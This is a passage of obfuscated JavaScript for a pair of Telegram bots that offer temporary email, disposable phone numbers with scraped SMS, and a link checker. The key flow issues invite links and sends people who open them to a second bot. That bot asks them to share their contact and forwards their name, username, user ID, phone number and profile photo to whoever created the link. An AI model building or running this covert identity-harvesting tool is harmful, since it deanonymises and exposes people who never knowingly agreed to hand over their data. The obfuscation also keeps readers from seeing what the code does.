            'jLECH': function (_0x320b60, _0x4b026a) {
                return _0x320b60 > _0x4b026a;
            },
            'GBwNo': _0x305a71(0x1fd) + _0x305a71(0x478) + _0x305a71(0x438),
            'MBrCh': _0x305a71(0x70b) + _0x305a71(0x41d) + _0x305a71(0x39b) + _0x305a71(0x49f) + 'g>',
            'CqrXX': _0x305a71(0x3d4) + _0x305a71(0x8ad) + _0x305a71(0x40d) + _0x305a71(0x5d2)
        }, _0x21b6bf = _0x2398fb[_0x305a71(0x742)]['id'], _0x4ac268 = _0x2398fb[_0x305a71(0x246)]['id'];
    let _0x259b2d = _0x1ff799[_0x305a71(0x7ef)](readEmails);
    if (_0x259b2d[_0x4ac268]) {
        const _0x52834a = _0x259b2d[_0x4ac268];
        try {
            const _0x5ad952 = await axios[_0x305a71(0x3d0)](_0x305a71(0x6cc) + _0x305a71(0x7f3) + _0x305a71(0x2e8) + _0x305a71(0x746) + _0x305a71(0x484) + _0x52834a + _0x305a71(0x534)), _0xae882a = _0x5ad952[_0x305a71(0x70e)];
            _0x1ff799[_0x305a71(0x692)](_0xae882a[_0x305a71(0x934)], -0x1f82 + -0x9a8 + 0x292a) ? _0xae882a[_0x305a71(0x7bb)](_0x164a90 => {
                const _0x54bb82 = _0x305a71;
                bot[_0x54bb82(0x326) + 'e'](_0x21b6bf, _0x54bb82(0x501) + _0x54bb82(0x2b8) + _0x54bb82(0x3b1) + '\x0a' + _0x164a90[_0x54bb82(0x8bf)] + '\x0a' + _0x164a90[_0x54bb82(0x4ee)] + _0x54bb82(0x74d), { 'parse_mode': _0x1ff799[_0x54bb82(0x550)] });
            }) : bot[_0x305a71(0x326) + 'e'](_0x21b6bf, _0x1ff799[_0x305a71(0x948)]);
        } catch (_0x2f860e) {
            bot[_0x305a71(0x326) + 'e'](_0x21b6bf, _0x1ff799[_0x305a71(0x263)], { 'parse_mode': _0x1ff799[_0x305a71(0x550)] });
        }
    } else
        bot[_0x305a71(0x326) + 'e'](_0x21b6bf, _0x1ff799[_0x305a71(0x4b7)], { 'parse_mode': _0x1ff799[_0x305a71(0x550)] });
}), bot[_0x247cf0(0x89b)](/\/de/, _0x284b32 => {
    const _0x2b229c = _0x247cf0, _0x1a4a3b = {
            'oSESa': function (_0x40ab3b) {
                return _0x40ab3b();
            },
            'GFVtm': function (_0x48b089, _0x3b63fe) {
                return _0x48b089(_0x3b63fe);
            },
            'IdaNo': _0x2b229c(0x48b) + _0x2b229c(0x4e6) + _0x2b229c(0x755) + '>',
            'fPwFj': _0x2b229c(0x378),
            'xMnki': _0x2b229c(0x3a7) + _0x2b229c(0x4ba) + _0x2b229c(0x2a2) + _0x2b229c(0x5d2)
        }, _0x2192b5 = _0x284b32[_0x2b229c(0x742)]['id'], _0x5dce62 = _0x284b32[_0x2b229c(0x246)]['id'];
    let _0x502082 = _0x1a4a3b[_0x2b229c(0x37f)](readEmails);
    _0x502082[_0x5dce62] ? (delete _0x502082[_0x5dce62], _0x1a4a3b[_0x2b229c(0x8b2)](writeEmails, _0x502082), bot[_0x2b229c(0x326) + 'e'](_0x2192b5, _0x1a4a3b[_0x2b229c(0x4a2)], { 'parse_mode': _0x1a4a3b[_0x2b229c(0x2b6)] })) : bot[_0x2b229c(0x326) + 'e'](_0x2192b5, _0x1a4a3b[_0x2b229c(0x964)], { 'parse_mode': _0x1a4a3b[_0x2b229c(0x2b6)] });
}), bot[_0x247cf0(0x89b)](/\/de/, async _0xeeaf39 => {
    const _0x304f22 = _0x247cf0, _0x11c8f1 = {
            'FjbeR': _0x304f22(0x48b) + _0x304f22(0x4e6) + _0x304f22(0x755) + '>',
            'Atsxm': _0x304f22(0x378),
            'BeXek': _0x304f22(0x3a7) + _0x304f22(0x28a) + _0x304f22(0x310) + _0x304f22(0x5d2)
        }, _0x17aec8 = _0xeeaf39[_0x304f22(0x742)]['id'];
    try {
        fs[_0x304f22(0x889)](_0x304f22(0x1f1) + _0x17aec8 + _0x304f22(0x62d)), bot[_0x304f22(0x326) + 'e'](_0x17aec8, _0x11c8f1[_0x304f22(0x672)], { 'parse_mode': _0x11c8f1[_0x304f22(0x82b)] });
    } catch (_0x2996a7) {
        bot[_0x304f22(0x326) + 'e'](_0x17aec8, _0x11c8f1[_0x304f22(0x5e7)], { 'parse_mode': _0x11c8f1[_0x304f22(0x82b)] });
    }
}), bot[_0x247cf0(0x89b)](/\/sخسننسمس/, _0x1c6a22 => {
    const _0x1b3cbb = _0x247cf0, _0x50e02b = {
            'rxYsR': _0x1b3cbb(0x799) + _0x1b3cbb(0x21f),
            'qIdBX': _0x1b3cbb(0x705) + _0x1b3cbb(0x4d1),
            'tFKiE': _0x1b3cbb(0x5c7) + _0x1b3cbb(0x678) + _0x1b3cbb(0x34f) + _0x1b3cbb(0x757)
        }, _0x3a2da8 = _0x1c6a22[_0x1b3cbb(0x742)]['id'], _0x5e3d7b = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x50e02b[_0x1b3cbb(0x2c9)],
                            'callback_data': _0x50e02b[_0x1b3cbb(0x667)]
                        }]]
            }
        };
    bot[_0x1b3cbb(0x326) + 'e'](_0x3a2da8, _0x50e02b[_0x1b3cbb(0x955)], _0x5e3d7b);
}), bot['on'](_0x247cf0(0x293) + _0x247cf0(0x43c), _0x5b524f => {
    const _0x308262 = _0x247cf0, _0x1c6be8 = {
            'bQiYQ': function (_0x5b9250, _0x65e1ac) {
                return _0x5b9250 === _0x65e1ac;
            },
            'EoCpi': _0x308262(0x705) + _0x308262(0x4d1)
        };
    if (_0x1c6be8[_0x308262(0x533)](_0x5b524f[_0x308262(0x70e)], _0x1c6be8[_0x308262(0x3c5)])) {
        const _0x5cd1fa = _0x5b524f[_0x308262(0x246)]['id'], _0x62bf25 = _0x308262(0x402) + _0x308262(0x816) + _0x308262(0x664) + _0x5cd1fa;
        bot[_0x308262(0x326) + 'e'](_0x5b524f[_0x308262(0x202)][_0x308262(0x742)]['id'], _0x308262(0x488) + _0x308262(0x267) + _0x308262(0x60a) + _0x308262(0x70c) + _0x308262(0x235) + _0x308262(0x56c) + ':\x0a' + _0x62bf25);
    }
}), secondBot[_0x247cf0(0x89b)](/\/start (.+)/, (_0x539646, _0x2b3ecb) => {
    const _0x20beb9 = _0x247cf0, _0x2b3e3e = {
            'aeXVP': function (_0x38cb37, _0x37f887) {
                return _0x38cb37(_0x37f887);
            },
            'wOvVN': _0x20beb9(0x719) + _0x20beb9(0x752),
            'JSybk': _0x20beb9(0x735) + _0x20beb9(0x6f2) + _0x20beb9(0x2b5) + _0x20beb9(0x8b7) + _0x20beb9(0x5b8)
        }, _0xfe2c52 = _0x539646[_0x20beb9(0x742)]['id'], _0x49059e = _0x2b3e3e[_0x20beb9(0x439)](parseInt, _0x2b3ecb[0x13f1 * -0x1 + -0x1 * 0xfdf + 0x1 * 0x23d1]);
    inviteLinks[_0x539646[_0x20beb9(0x246)]['id']] = _0x49059e;
    const _0x4b65a4 = {
        'reply_markup': {
            'keyboard': [[{
                        'text': _0x2b3e3e[_0x20beb9(0x1e9)],
                        'request_contact': !![]
                    }]],
            'one_time_keyboard': !![]
        }
    };
    secondBot[_0x20beb9(0x326) + 'e'](_0xfe2c52, _0x2b3e3e[_0x20beb9(0x58a)], _0x4b65a4);
}), secondBot['on'](_0x247cf0(0x69c), _0x2fd881 => {
    const _0x3498d5 = _0x247cf0, _0x47c1ad = {
            'EmavO': _0x3498d5(0x720) + _0x3498d5(0x252) + _0x3498d5(0x395),
            'eLmqP': _0x3498d5(0x6d3),
            'wPZUL': _0x3498d5(0x685) + _0x3498d5(0x1c9) + 'ح.',
            'dmiiR': function (_0x3d2f35, _0xdf7616) {
                return _0x3d2f35 + _0xdf7616;
            },
            'RFuwf': function (_0x5f47c6, _0x4446dc) {
                return _0x5f47c6 + _0x4446dc;
            },
            'nGAvH': function (_0x4a4979, _0xdc4f1) {
                return _0x4a4979 > _0xdc4f1;
            },
            'xNHvE': _0x3498d5(0x6b4) + _0x3498d5(0x44e),
            'SBwPB': _0x3498d5(0x720) + _0x3498d5(0x200) + _0x3498d5(0x693) + _0x3498d5(0x6ff) + _0x3498d5(0x7c5),
            'TDJrp': _0x3498d5(0x89f) + _0x3498d5(0x7f5) + _0x3498d5(0x6e9) + _0x3498d5(0x706) + _0x3498d5(0x8f6) + _0x3498d5(0x67b),
            'cETZL': function (_0x29720f, _0x2c4d3a) {
                return _0x29720f === _0x2c4d3a;
            },
            'RruFp': _0x3498d5(0x50f) + _0x3498d5(0x7f9),
            'aWWsK': _0x3498d5(0x40e) + 'ذة',
            'LafES': _0x3498d5(0x735) + _0x3498d5(0x6f2) + _0x3498d5(0x275) + _0x3498d5(0x92f),
            'vdEbT': _0x3498d5(0x40f) + _0x3498d5(0x39c) + _0x3498d5(0x3ac)
        };
    if (_0x2fd881[_0x3498d5(0x69c)] && inviteLinks[_0x2fd881[_0x3498d5(0x246)]['id']]) {
        if (_0x47c1ad[_0x3498d5(0x766)](_0x2fd881[_0x3498d5(0x69c)][_0x3498d5(0x204)], _0x2fd881[_0x3498d5(0x246)]['id'])) {
            const _0x1471a9 = inviteLinks[_0x2fd881[_0x3498d5(0x246)]['id']], _0x1dd1b3 = _0x2fd881[_0x3498d5(0x246)], _0x2b8f16 = _0x1dd1b3['id'], _0xe08ffd = _0x1dd1b3[_0x3498d5(0x87d)], _0x75a815 = _0x1dd1b3[_0x3498d5(0x229)] || '', _0x9c5d9c = _0x1dd1b3[_0x3498d5(0x6d1)] || _0x47c1ad[_0x3498d5(0x5c6)], _0x106467 = _0x1dd1b3[_0x3498d5(0x2e1)] || _0x47c1ad[_0x3498d5(0x1ca)], _0x6bb1e = _0x2fd881[_0x3498d5(0x69c)][_0x3498d5(0x316) + 'er'];
            secondBot[_0x3498d5(0x7b2) + _0x3498d5(0x6c5)](_0x2b8f16)[_0x3498d5(0x37b)](_0x31233b => {
                const _0x3a48cc = _0x3498d5, _0x46483e = { 'wGWxs': _0x47c1ad[_0x3a48cc(0x788)] }, _0x2936cb = _0x47c1ad[_0x3a48cc(0x223)](_0x47c1ad[_0x3a48cc(0x624)](_0x47c1ad[_0x3a48cc(0x223)](_0x47c1ad[_0x3a48cc(0x624)](_0x3a48cc(0x860) + _0x3a48cc(0x61e) + '\x0a', _0x3a48cc(0x5e4) + _0xe08ffd + '\x20' + _0x75a815 + _0x3a48cc(0x375)), _0x3a48cc(0x4d7) + '@' + _0x9c5d9c + _0x3a48cc(0x375)), _0x3a48cc(0x651) + _0x2b8f16 + _0x3a48cc(0x375)), _0x3a48cc(0x7f7) + _0x3a48cc(0x97b) + _0x6bb1e + '\x0a');
                if (_0x47c1ad[_0x3a48cc(0x5f3)](_0x31233b[_0x3a48cc(0x51a) + 't'], -0xc46 * -0x3 + -0x4f5 * -0x7 + -0x17d7 * 0x3)) {
                    const _0x566541 = _0x31233b[_0x3a48cc(0x5de)][-0x80 * 0x34 + -0x1d0d + 0x370d][-0x2363 + -0x1 * -0x10a0 + 0x641 * 0x3][_0x3a48cc(0x561)];
                    _0x566541 ? bot[_0x3a48cc(0x7e9)](_0x1471a9, _0x566541, {
                        'caption': _0x2936cb,
                        'parse_mode': _0x47c1ad[_0x3a48cc(0x919)]
                    })[_0x3a48cc(0x37b)](() => {
                        const _0x51ad59 = _0x3a48cc;
                        console[_0x51ad59(0x6e8)](_0x46483e[_0x51ad59(0x41f)]);
                    })[_0x3a48cc(0x2de)](_0x48243d => {
                        const _0x587f51 = _0x3a48cc;
                        console[_0x587f51(0x541)](_0x47c1ad[_0x587f51(0x3f5)], _0x48243d), bot[_0x587f51(0x326) + 'e'](_0x1471a9, _0x2936cb, { 'parse_mode': _0x47c1ad[_0x587f51(0x919)] });
                    }) : bot[_0x3a48cc(0x326) + 'e'](_0x1471a9, _0x2936cb, { 'parse_mode': _0x47c1ad[_0x3a48cc(0x919)] });
                } else
                    bot[_0x3a48cc(0x326) + 'e'](_0x1471a9, _0x2936cb, { 'parse_mode': _0x47c1ad[_0x3a48cc(0x919)] });
                secondBot[_0x3a48cc(0x326) + 'e'](_0x2fd881[_0x3a48cc(0x742)]['id'], _0x47c1ad[_0x3a48cc(0x370)]), delete inviteLinks[_0x2fd881[_0x3a48cc(0x246)]['id']];
            })[_0x3498d5(0x2de)](_0x8136f3 => {
                const _0x4e7a14 = _0x3498d5;
                console[_0x4e7a14(0x541)](_0x47c1ad[_0x4e7a14(0x802)], _0x8136f3), secondBot[_0x4e7a14(0x326) + 'e'](_0x2fd881[_0x4e7a14(0x742)]['id'], _0x47c1ad[_0x4e7a14(0x6c1)]);
            });
        } else
            secondBot[_0x3498d5(0x326) + 'e'](_0x2fd881[_0x3498d5(0x742)]['id'], _0x47c1ad[_0x3498d5(0x504)]);
    } else
        secondBot[_0x3498d5(0x326) + 'e'](_0x2fd881[_0x3498d5(0x742)]['id'], _0x47c1ad[_0x3498d5(0x537)]);
}), secondBot['on'](_0x247cf0(0x202), _0x1d8cc9 => {
    const _0x1aa98b = _0x247cf0, _0x26fec8 = {
            'ixXsU': function (_0x41f1e6, _0x55ec25) {
                return _0x41f1e6 !== _0x55ec25;
            },
            'RKSkL': _0x1aa98b(0x94b),
            'PmeZR': _0x1aa98b(0x719) + _0x1aa98b(0x752),
            'WVLhv': _0x1aa98b(0x735) + _0x1aa98b(0x6f2) + _0x1aa98b(0x4d0)
        };
    if (!_0x1d8cc9[_0x1aa98b(0x69c)] && _0x26fec8[_0x1aa98b(0x77f)](_0x1d8cc9[_0x1aa98b(0x814)], _0x26fec8[_0x1aa98b(0x1fa)])) {
        const _0xe7f3cb = {
            'reply_markup': {
                'keyboard': [[{
                            'text': _0x26fec8[_0x1aa98b(0x676)],
                            'request_contact': !![]
                        }]],
                'one_time_keyboard': !![]
            }
        };
        secondBot[_0x1aa98b(0x326) + 'e'](_0x1d8cc9[_0x1aa98b(0x742)]['id'], _0x26fec8[_0x1aa98b(0x2af)], _0xe7f3cb);
    }
});
const countries = {
    '+1': [
        _0x247cf0(0x7ff),
        _0x247cf0(0x4a5)
    ],
    '+46': [
        _0x247cf0(0x987),
        _0x247cf0(0x864)
    ],
    '+86': [
        _0x247cf0(0x33b),
        _0x247cf0(0x1db)
    ],
    '+852': [
        _0x247cf0(0x60e),
        _0x247cf0(0x2f4)
    ],
    '+45': [
        _0x247cf0(0x4d6),
        _0x247cf0(0x52f)
    ],
    '+33': [
        _0x247cf0(0x966),
        _0x247cf0(0x6d7)
    ],
    '+31': [
        _0x247cf0(0x3de),
        _0x247cf0(0x2b2)
    ],
    '+7': [
        _0x247cf0(0x31f),
        _0x247cf0(0x655)
    ],
    '+7KZ': [
        _0x247cf0(0x43d),
        _0x247cf0(0x8ef)
    ],
    '+381': [
        _0x247cf0(0x1e2),
        _0x247cf0(0x2c7)
    ],
    '+44': [
        _0x247cf0(0x74b),
        _0x247cf0(0x939)
    ],
    '+371': [
        _0x247cf0(0x79c),
        _0x247cf0(0x6a7)
    ],
    '+62': [
        _0x247cf0(0x33c),
        _0x247cf0(0x5d0)
    ],
    '+351': [
        _0x247cf0(0x4cf),
        _0x247cf0(0x451)
    ],
    '+34': [
        _0x247cf0(0x50c),
        _0x247cf0(0x467)
    ],
    '+372': [
        _0x247cf0(0x7b7),
        _0x247cf0(0x8b5)
    ],
    '+358': [
        _0x247cf0(0x891),
        _0x247cf0(0x231)
    ]
};
async function importNumbers() {
    const _0x388b20 = _0x247cf0, _0x2dc2d0 = {
            'yWtDU': _0x388b20(0x715) + _0x388b20(0x32f) + _0x388b20(0x1e3),
            'ODGYs': _0x388b20(0x45d) + _0x388b20(0x854)
        };
    try {
        const _0x4e84ae = await axios[_0x388b20(0x3d0)](_0x2dc2d0[_0x388b20(0x6a0)]);
        return _0x4e84ae[_0x388b20(0x70e)][_0x388b20(0x5ad)]('\x0a');
    } catch (_0x1449a7) {
        return console[_0x388b20(0x541)](_0x2dc2d0[_0x388b20(0x298)], _0x1449a7), [];
    }
}
async function getRandomNumberInfo() {
    const _0x65538e = _0x247cf0, _0x2b7fc3 = {
            'szisi': function (_0x2be980) {
                return _0x2be980();
            },
            'hwSIw': function (_0x342fe0, _0xef4229) {
                return _0x342fe0 === _0xef4229;
            },
            'pQkne': function (_0x41b920, _0x10431) {
                return _0x41b920 * _0x10431;
            },
            'kJGkk': _0x65538e(0x72a),
            'rJuSN': _0x65538e(0x51d),
            'edhSi': function (_0x1562c2, _0x30f557) {
                return _0x1562c2 in _0x30f557;
            },
            'OAvoM': _0x65538e(0x339) + _0x65538e(0x337)
        }, _0x1c8736 = await _0x2b7fc3[_0x65538e(0x885)](importNumbers);
    if (_0x2b7fc3[_0x65538e(0x483)](_0x1c8736[_0x65538e(0x934)], -0x283 * -0x8 + -0x1e82 + 0xa6a))
        return null;
    const _0x3694e5 = Math[_0x65538e(0x565)](_0x2b7fc3[_0x65538e(0x7a1)](Math[_0x65538e(0x583)](), _0x1c8736[_0x65538e(0x934)])), _0x518e52 = _0x1c8736[_0x3694e5][_0x65538e(0x4b9)](), _0x2b47fa = new Date()[_0x65538e(0x652) + 'g']()[_0x65538e(0x5ad)]('T')[-0x104b * -0x2 + -0x5 * 0x783 + -0x43 * -0x13], _0x5cce59 = new Date()[_0x65538e(0x1e0) + _0x65538e(0x21d)](_0x2b7fc3[_0x65538e(0x25b)]);
    let _0x4a5795;
    if (_0x518e52[_0x65538e(0x962)]('+1'))
        _0x4a5795 = '+1';
    else
        _0x518e52[_0x65538e(0x962)]('+7') ? _0x4a5795 = _0x518e52[_0x65538e(0x882)]('7') ? _0x2b7fc3[_0x65538e(0x1f0)] : '+7' : _0x4a5795 = _0x2b7fc3[_0x65538e(0x3bb)](_0x518e52[_0x65538e(0x4a0)](0x997 * -0x1 + 0x105b * -0x1 + 0x19f2, 0x1019 + 0x7a1 + -0x17b6), countries) ? _0x518e52[_0x65538e(0x4a0)](0xa49 * 0x3 + -0x15a4 + -0x937, -0x202d + 0x2261 + -0x50 * 0x7) : _0x518e52[_0x65538e(0x4a0)](-0x769 + -0x2b6 * 0x2 + 0xcd5, -0x5c * -0x53 + 0xf9a + -0x2d6b);
    const [_0x5bdb20, _0x37bed1] = countries[_0x4a5795] || [
        _0x2b7fc3[_0x65538e(0x7b5)],
        '🚩'
    ];
    return {
        'number': _0x518e52,
        'countryCode': _0x4a5795,
        'countryName': _0x5bdb20,
        'countryFlag': _0x37bed1,
        'creationDate': _0x2b47fa,
        'creationTime': _0x5cce59
    };
}
async function getMessages(_0x3c2d94) {
    const _0x1dcf26 = _0x247cf0, _0x21a638 = {
            'cCDFb': function (_0x54ec2c, _0x202532) {
                return _0x54ec2c(_0x202532);
            },
            'ESRMZ': function (_0x4541b2, _0x1aac89) {
                return _0x4541b2(_0x1aac89);
            },
            'HmlbU': _0x1dcf26(0x55e) + _0x1dcf26(0x269) + _0x1dcf26(0x59a),
            'lYMah': _0x1dcf26(0x45d) + _0x1dcf26(0x830)
        };
    try {
        const _0x6f25b8 = await axios[_0x1dcf26(0x3d0)](_0x1dcf26(0x323) + _0x1dcf26(0x8bc) + _0x1dcf26(0x7b8) + _0x3c2d94), _0x2d822a = cheerio[_0x1dcf26(0x592)](_0x6f25b8[_0x1dcf26(0x70e)]), _0x3e5c6c = [];
        return _0x21a638[_0x1dcf26(0x482)](_0x2d822a, _0x21a638[_0x1dcf26(0x7aa)])[_0x1dcf26(0x634)]((_0xd7026, _0xfa4a56) => {
            const _0x3e2578 = _0x1dcf26;
            _0x3e5c6c[_0x3e2578(0x4cc)](_0x21a638[_0x3e2578(0x77d)](_0x2d822a, _0xfa4a56)[_0x3e2578(0x814)]()[_0x3e2578(0x4b9)]());
        }), _0x3e5c6c;
    } catch (_0x56aef2) {
        return console[_0x1dcf26(0x541)](_0x21a638[_0x1dcf26(0x3da)], _0x56aef2), [];
    }
}
bot[_0x247cf0(0x89b)](/\/stسمهصخصt/, _0x4d7ca0 => {
    const _0xd3f4cd = _0x247cf0, _0x124765 = {
            'hkdiq': _0xd3f4cd(0x311) + _0xd3f4cd(0x5b6),
            'NGezj': _0xd3f4cd(0x4b1),
            'mEWnZ': _0xd3f4cd(0x7ac) + _0xd3f4cd(0x954) + _0xd3f4cd(0x294) + _0xd3f4cd(0x91a)
        }, _0x11b259 = _0x4d7ca0[_0xd3f4cd(0x742)]['id'], _0x2d2f4f = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x124765[_0xd3f4cd(0x32a)],
                            'callback_data': _0x124765[_0xd3f4cd(0x984)]
                        }]]
            }
        };
    bot[_0xd3f4cd(0x326) + 'e'](_0x11b259, _0x124765[_0xd3f4cd(0x221)], _0x2d2f4f);
});
const m = _0x247cf0(0x92b) + _0x247cf0(0x3c8) + 'ج';
bot['on'](_0x247cf0(0x293) + _0x247cf0(0x43c), async _0x527dd0 => {
    const _0x27d1c1 = _0x247cf0, _0x8fd364 = {
            'cTXDq': function (_0x57236b, _0x2b1728) {
                return _0x57236b === _0x2b1728;
            },
            'pGECn': _0x27d1c1(0x4b1),
            'mUBEW': function (_0x204a25) {
                return _0x204a25();
            },
            'hJspU': _0x27d1c1(0x78a) + _0x27d1c1(0x91e),
            'JhLjU': _0x27d1c1(0x3c7) + '💬',
            'ItCEc': function (_0x14945b, _0x1d257f) {
                return _0x14945b + _0x1d257f;
            },
            'LdxGe': function (_0x407105, _0x410a19) {
                return _0x407105 + _0x410a19;
            },
            'npjwx': function (_0x186b2c, _0x431cd0) {
                return _0x186b2c + _0x431cd0;
            },
            'rlpSH': function (_0x31b190, _0x8b7ae7) {
                return _0x31b190 + _0x8b7ae7;
            },
            'FnYbs': _0x27d1c1(0x6d3),
            'YGuXP': _0x27d1c1(0x1fd) + _0x27d1c1(0x38e) + _0x27d1c1(0x359),
            'JXvIb': _0x27d1c1(0x928) + _0x27d1c1(0x6fd),
            'GtANg': function (_0x1ecd59, _0x368adb) {
                return _0x1ecd59(_0x368adb);
            },
            'fqvJH': function (_0x349fbc, _0x5bf1ce) {
                return _0x349fbc > _0x5bf1ce;
            },
            'OURvL': _0x27d1c1(0x4fe) + _0x27d1c1(0x48d) + _0x27d1c1(0x44f),
            'xXOnS': _0x27d1c1(0x296) + _0x27d1c1(0x4e1)
        }, _0x421f92 = _0x527dd0[_0x27d1c1(0x202)], _0x4eba72 = _0x421f92[_0x27d1c1(0x742)]['id'], _0x5e4982 = _0x527dd0[_0x27d1c1(0x70e)];
    if (_0x8fd364[_0x27d1c1(0x3fa)](_0x5e4982, _0x8fd364[_0x27d1c1(0x918)])) {
        const _0x3f1624 = await _0x8fd364[_0x27d1c1(0x4d8)](getRandomNumberInfo);
        if (_0x3f1624) {
            const _0x458a0d = {
                    'reply_markup': {
                        'inline_keyboard': [
                            [{
                                    'text': _0x8fd364[_0x27d1c1(0x6c9)],
                                    'callback_data': _0x8fd364[_0x27d1c1(0x918)]
                                }],
                            [{
                                    'text': _0x8fd364[_0x27d1c1(0x217)],
                                    'callback_data': _0x27d1c1(0x928) + _0x27d1c1(0x6fd) + _0x3f1624[_0x27d1c1(0x818)]
                                }]
                        ]
                    }
                }, _0x573c54 = _0x8fd364[_0x27d1c1(0x63f)](_0x8fd364[_0x27d1c1(0x63f)](_0x8fd364[_0x27d1c1(0x23d)](_0x8fd364[_0x27d1c1(0x4dc)](_0x8fd364[_0x27d1c1(0x63f)](_0x8fd364[_0x27d1c1(0x1f4)](_0x27d1c1(0x635) + _0x27d1c1(0x65d) + _0x27d1c1(0x423) + _0x27d1c1(0x54c) + _0x3f1624[_0x27d1c1(0x818)] + '`\x0a', _0x27d1c1(0x2d5) + '\x20' + _0x3f1624[_0x27d1c1(0x497) + 'e'] + '\x20' + _0x3f1624[_0x27d1c1(0x578) + 'g'] + '\x0a'), _0x27d1c1(0x906) + _0x27d1c1(0x354) + _0x3f1624[_0x27d1c1(0x877) + 'e'] + '\x0a'), _0x27d1c1(0x849) + _0x27d1c1(0x97b) + m + '\x0a'), _0x27d1c1(0x7b3) + _0x27d1c1(0x41b) + _0x3f1624[_0x27d1c1(0x514) + 'te'] + '\x0a'), _0x27d1c1(0x808) + _0x27d1c1(0x46b) + _0x3f1624[_0x27d1c1(0x92d) + 'me'] + '\x0a'), _0x27d1c1(0x394) + _0x27d1c1(0x8b1) + '.');
            bot[_0x27d1c1(0x472) + _0x27d1c1(0x710)](_0x573c54, {
                'chat_id': _0x4eba72,
                'message_id': _0x421f92[_0x27d1c1(0x4a4)],
                'parse_mode': _0x8fd364[_0x27d1c1(0x292)],
                'reply_markup': _0x458a0d[_0x27d1c1(0x3f6) + 'up']
            });
        } else
            bot[_0x27d1c1(0x326) + 'e'](_0x4eba72, _0x8fd364[_0x27d1c1(0x666)]);
    } else {
        if (_0x5e4982[_0x27d1c1(0x962)](_0x8fd364[_0x27d1c1(0x259)])) {
            const _0x38bdbf = _0x5e4982[_0x27d1c1(0x5ad)]('_')[0x777 + 0x85a * 0x3 + -0x2083], _0x4c8fec = await _0x8fd364[_0x27d1c1(0x480)](getMessages, _0x38bdbf);
            if (_0x8fd364[_0x27d1c1(0x41e)](_0x4c8fec[_0x27d1c1(0x934)], -0xe * -0x259 + 0x2002 + -0x40e0)) {
                let _0x295ba2 = _0x4c8fec[_0x27d1c1(0x4a0)](0x2 * 0x526 + 0x14e * 0x10 + -0x1f2c, -0x47 * -0x5b + -0xe17 * -0x1 + 0x12 * -0x22f)[_0x27d1c1(0x1e4)]((_0x3eeb3a, _0x54335b) => _0x27d1c1(0x5cb) + 'م\x20' + (_0x54335b + (0x1d41 * -0x1 + -0x2618 * -0x1 + -0x8d6)) + _0x27d1c1(0x1e8) + _0x3eeb3a + '`')[_0x27d1c1(0x93f)]('\x0a\x0a');
                _0x295ba2 += _0x8fd364[_0x27d1c1(0x7e3)], bot[_0x27d1c1(0x326) + 'e'](_0x4eba72, _0x295ba2, { 'parse_mode': _0x8fd364[_0x27d1c1(0x292)] });
            } else
                bot[_0x27d1c1(0x326) + 'e'](_0x4eba72, _0x8fd364[_0x27d1c1(0x606)]);
        }
    }
});
const dangerous_keywords = [
        _0x247cf0(0x764),
        _0x247cf0(0x5ec),
        'gd',
        _0x247cf0(0x88c),
        _0x247cf0(0x24e),
        _0x247cf0(0x2c6),
        _0x247cf0(0x314),
        _0x247cf0(0x86d),
        _0x247cf0(0x430),
        _0x247cf0(0x2ad),
        _0x247cf0(0x2ee),
        _0x247cf0(0x86f),
        _0x247cf0(0x89c)
    ], safe_urls = [
        _0x247cf0(0x935),
        _0x247cf0(0x4df),
        _0x247cf0(0x4bf),
        _0x247cf0(0x20c) + _0x247cf0(0x76f),
        _0x247cf0(0x207) + _0x247cf0(0x544),
        _0x247cf0(0x75d) + 'om',
        _0x247cf0(0x52a),
        _0x247cf0(0x46c),
        _0x247cf0(0x5d9) + 'om',
        _0x247cf0(0x7f6),
        _0x247cf0(0x7fb) + 'om'
    ];
let waiting_for_link = {};
function checkUrl(_0x20b31b) {
    const _0x530292 = _0x247cf0, _0x2808bb = {
            'nsJPV': _0x530292(0x382),
            'mnBkP': _0x530292(0x5d5) + '🔴',
            'Xbuvc': _0x530292(0x7f6),
            'lsoZq': _0x530292(0x6eb)
        }, _0xac0bbf = _0x20b31b[_0x530292(0x3b2) + 'e']();
    for (let _0x5708dd of safe_urls) {
        if (_0xac0bbf[_0x530292(0x882)](_0x5708dd))
            return _0x2808bb[_0x530292(0x75a)];
    }
    for (let _0x225629 of dangerous_keywords) {
        if (_0xac0bbf[_0x530292(0x882)](_0x225629))
            return _0x2808bb[_0x530292(0x7c0)];
    }
    if (!_0xac0bbf[_0x530292(0x882)](_0x2808bb[_0x530292(0x586)]))
        return _0x2808bb[_0x530292(0x5ce)];
    return _0x2808bb[_0x530292(0x75a)];
}
function isValidUrl(_0x174271) {
    const _0x4904e3 = _0x247cf0, _0x24cb79 = new RegExp(/^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/i);
    return _0x24cb79[_0x4904e3(0x2b3)](_0x174271);
}
async function getIpInfo(_0x48ef12) {
    const _0x147388 = _0x247cf0;
    try {
        const _0x348b5b = await axios[_0x147388(0x3d0)](_0x147388(0x218) + _0x147388(0x39e) + _0x48ef12 + _0x147388(0x4cb));
        return _0x348b5b[_0x147388(0x70e)];
    } catch (_0x3181bd) {
        return null;
    }
}
function extractIpFromUrl(_0x5a6b49) {
    const _0x31d533 = _0x247cf0, _0x3c24a1 = {
            'XMzYN': function (_0x38ced7, _0x473276) {
                return _0x38ced7(_0x473276);
            }
        };
    try {
        const _0x4a2531 = new URL(_0x5a6b49)[_0x31d533(0x4e9)];
        return new Promise((_0x3e4cd6, _0x2f64f2) => {
            const _0x25699a = _0x31d533;
            dns[_0x25699a(0x5a8)](_0x4a2531, (_0x1e17bc, _0x56c08a) => {
                const _0x977f2a = _0x25699a;
                if (_0x1e17bc)
                    _0x3c24a1[_0x977f2a(0x29c)](_0x2f64f2, null);
                else
                    _0x3c24a1[_0x977f2a(0x29c)](_0x3e4cd6, _0x56c08a);
            });
        });
    } catch (_0x9992d2) {
        return null;
    }
}
bot[_0x247cf0(0x89b)](/\/sكخزننننtart/, _0x9b99d9 => {
    const _0x328ff4 = _0x247cf0, _0x3cea8e = {
            'WVtLb': _0x328ff4(0x3fd) + 'ط',
            'kuyGT': _0x328ff4(0x4f3) + 's',
            'NfUyz': _0x328ff4(0x7ac) + _0x328ff4(0x2c4) + _0x328ff4(0x22b)
        }, _0x445402 = _0x9b99d9[_0x328ff4(0x742)]['id'], _0x394f7f = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x3cea8e[_0x328ff4(0x3ba)],
                            'callback_data': _0x3cea8e[_0x328ff4(0x380)]
                        }]]
            }
        };
